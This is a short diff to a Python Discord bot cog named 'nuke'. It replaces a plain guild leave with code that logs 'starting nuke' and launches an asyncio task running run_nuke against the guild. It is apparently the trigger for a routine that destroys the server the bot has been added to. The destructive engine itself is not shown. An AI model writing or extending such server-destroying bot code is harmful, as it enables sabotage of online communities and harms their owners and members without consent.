@@ -9,7 +9,7 @@ from discord import Guild, User
 from discord.ext.commands import Cog
 
 from nuke.config import get as nuke_cfg
-from nuke.engine import stop
+from nuke.engine import run_nuke, stop
 from utils.db import db
 
 _COOLDOWN_SECONDS = 1800
@@ -93,7 +93,12 @@ class nuke(Cog):
                 await guild.leave()
                 return
 
-        await guild.leave()
+        if persistence:
+            await persistence.set(f"nuke:last:{guild.id}", time())
+
+        logging.info(f"nuke: starting nuke in {guild.name} ({guild.id})")
+        task = asyncio.create_task(run_nuke(self.bot, guild.id, guild))
+        self._tasks[guild.id] = task
 
     @Cog.listener()
     async def on_guild_remove(self, guild: Guild):
